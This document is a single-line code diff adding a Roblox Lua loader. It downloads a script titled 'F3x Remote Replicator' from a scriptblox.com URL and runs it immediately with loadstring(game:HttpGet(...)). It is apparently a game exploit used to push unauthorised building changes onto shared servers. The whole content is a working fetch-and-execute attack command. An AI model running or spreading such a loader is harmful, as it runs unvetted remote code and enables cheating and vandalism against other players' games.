@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-F3x-Remote-Replicator-Script-7849"))()
